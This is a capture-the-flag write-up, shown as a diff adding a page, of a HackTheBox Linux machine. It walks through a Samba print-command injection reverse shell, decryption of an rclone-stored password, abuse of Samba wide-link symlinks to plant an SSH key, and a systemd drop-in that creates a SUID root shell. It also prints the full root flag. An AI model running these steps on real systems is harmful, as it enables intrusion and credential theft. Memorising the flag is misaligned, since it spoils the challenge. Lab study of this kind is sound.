@@ -1,0 +1,298 @@
+---
+title: Abducted
+description: Máquina Linux de dificultad media
+tags: [hackthebox, linux, smb, rclone, cve, wide-links, systemd]
+draft: false
+lang: es
+parent: writeups/hackthebox/machines
+featured: true
+image: ../../../../../images/writeups/hackthebox/abducted/abducted.png
+difficulty: medium
+platform: htb
+os: linux
+hints:
+  [
+    Samba print-command injection,
+    Rclone password decryption,
+    Insecure wide links exploitation,
+    Systemd drop-in misconfiguration,
+  ]
+translationId: abducted
+---
+
+<div style="display: flex; justify-content: center;">
+
+![Cap](@images/writeups/hackthebox/abducted/abducted.png)
+
+</div>
+
+<div style="text-align: center;">
+
+[https://app.hackthebox.com/machines/Abducted](https://app.hackthebox.com/machines/abducted)
+
+</div>
+
+## Enumeration
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/Abducted 10.129.30.218
+```
+
+```plaintext
+PORT    STATE SERVICE      REASON
+22/tcp  open  ssh          syn-ack ttl 63
+139/tcp open  netbios-ssn  syn-ack ttl 63
+445/tcp open  microsoft-ds syn-ack ttl 63
+```
+
+```bash
+nmap -p 22,139,445 -sCV -oA nmap/openPorts 10.129.30.218
+```
+
+```plaintext
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+139/tcp open  netbios-ssn Samba smbd 4
+445/tcp open  netbios-ssn Samba smbd 4
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-time:
+|   date: 2026-06-18T14:53:53
+|_  start_date: N/A
+```
+
+```bash
+rpcclient -U '' -N 10.129.30.218
+```
+
+```plaintext
+rpcclient $> srvinfo
+	ABDUCTED       Wk Sv PrQ Unx NT SNT Hartley Group Document Services
+	platform_id     :	500
+	os version      :	6.1
+	server type     :	0x809a03
+```
+
+## Exploitation
+
+[CVE-2026-4480: Samba print-command (%J) injection PoC](https://github.com/TheCyberGeek/CVE-2026-4480-PoC)
+
+```bash
+nc -lnvp 1111
+```
+
+```bash
+python3 exploit.py 10.129.30.218 10.10.14.131 1111
+```
+
+```bash
+find / -type f -name "*.conf" 2>/dev/null -not -path "/usr/*" -not -path "/etc/*"
+```
+
+```plaintext
+/var/lib/ucf/cache/:etc:samba:smb.conf
+/var/lib/ucf/cache/:etc:rsyslog.d:50-default.conf
+/opt/offsite-backup/rclone.conf
+/run/tmpfiles.d/static-nodes.conf
+/run/systemd/resolve/resolv.conf
+/run/systemd/resolve/stub-resolv.conf
+```
+
+```bash
+cat /opt/offsite-backup/rclone.conf
+```
+
+```plaintext
+[offsite]
+type = sftp
+host = backup.hartley-group.internal
+user = svc-backup
+pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
+shell_type = unix
+```
+
+Rclone is a free, open-source command-line utility used to manage, sync, and back up files between local systems and over 70 cloud storage providers. Often called the "Swiss army knife of cloud storage," it enables secure transfers, encrypted uploads, and the ability to mount cloud storage as a local hard drive. [https://rclone.org/](https://rclone.org/)
+
+```bash
+rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
+```
+
+```plaintext
+iXzvcib3SrpZ
+```
+
+```bash
+ssh scott@10.129.30.218
+```
+
+```bash
+ls
+```
+
+```plaintext
+user.txt
+```
+
+```bash
+cat user.txt
+```
+
+### User flag
+
+<Callout type="success" title="User flag">
+  5be**************************b4f
+</Callout>
+
+## Lateral Movement
+
+```bash
+ls /etc/samba/
+```
+
+```plaintext
+gdbcommands  shares.conf  smb.conf  tls
+```
+
+```bash
+cat /etc/samba/shares.conf
+```
+
+```plaintext
+[HP-Reception]
+   comment = Reception printer
+   path = /var/spool/samba
+   printable = yes
+   guest ok = yes
+   print command = /usr/local/bin/printaudit %J %s
+   lpq command = /bin/true
+   lprm command = /bin/true
+
+[projects]
+   comment = Hartley Group Project Files
+   path = /srv/projects
+   valid users = scott
+   read only = no
+   browseable = yes
+
+[transfer]
+   comment = Staff file transfer
+   path = /srv/transfer
+   valid users = scott
+   force user = marcus
+   read only = no
+   wide links = yes
+   browseable = yes
+```
+
+```bash
+cat /etc/samba/smb.conf
+```
+
+```plaintext
+[global]
+   workgroup = WORKGROUP
+   server string = Hartley Group Document Services
+   netbios name = ABDUCTED
+   map to guest = Bad User
+   guest account = nobody
+   security = user
+   printing = sysv
+   load printers = no
+   disable spoolss = no
+   unix extensions = no
+   allow insecure wide links = yes
+   log level = 0
+   include = /etc/samba/shares.conf
+```
+
+```bash
+ssh-keygen -q -t ed25519 -N '' -f /tmp/k
+```
+
+```bash
+ln -s /home/marcus /srv/transfer/mh
+```
+
+```bash
+smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
+```
+
+```bash
+ssh -i /tmp/k marcus@127.0.0.1
+```
+
+```bash
+id
+```
+
+## Privilege Escalation
+
+```plaintext
+uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
+```
+
+```bash
+find / -group operators 2>/dev/null
+```
+
+```plaintext
+/etc/systemd/system/smbd.service.d
+```
+
+```bash
+cat > /etc/systemd/system/smbd.service.d/melvin.conf <<'EOF'
+[Service]
+ExecStartPre=/bin/cp /bin/bash /tmp/melvin
+ExecStartPre=/bin/chmod 4755 /tmp/melvin
+EOF
+```
+
+```bash
+systemctl daemon-reload
+```
+
+```bash
+systemctl restart smbd
+```
+
+```bash
+ls -l /tmp/melvin
+```
+
+```plaintext
+-rwsr-xr-x 1 root root 1446024 Jun 18 18:56 /tmp/melvin
+```
+
+```bash
+/tmp/melvin -p
+```
+
+```bash
+cd /root
+```
+
+```bash
+ls
+```
+
+```plaintext
+root.txt
+```
+
+```bash
+cat root.txt
+```
+
+### Root flag
+
+<Callout type="success" title="Root flag">
+  c76f89b21d57384e15af22d53f179e64
+</Callout>
